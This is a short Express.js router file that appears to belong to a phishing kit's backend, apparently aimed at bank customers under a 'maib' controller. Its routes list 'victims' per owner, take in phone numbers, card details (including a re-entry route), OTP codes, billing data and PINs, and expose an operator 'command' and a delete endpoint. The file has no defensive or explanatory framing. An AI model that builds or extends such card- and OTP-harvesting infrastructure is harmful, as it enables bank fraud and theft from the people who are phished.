const express = require("express");
const {
    getOwnerVics,
    command,
    getInfo,
    submitTelephone,
    submitCardAgain,
    submitCard,
    submitOtp,
    submitBilling,
    submitPin,
    deleteEntry,
} = require("../controllers/maibController");

const router = express.Router();

router.get("/customers/:owner", getOwnerVics);
router.post("/command", command);
router.get("/customers/id/:uniqueid", getInfo);
router.post("/telephone", submitTelephone);
router.post("/cardAgain", submitCardAgain);
router.post("/otp", submitOtp);
router.post("/card", submitCard);
router.post("/billing", submitBilling);
router.post("/pin", submitPin);
router.post("/delete", deleteEntry);

module.exports = router;
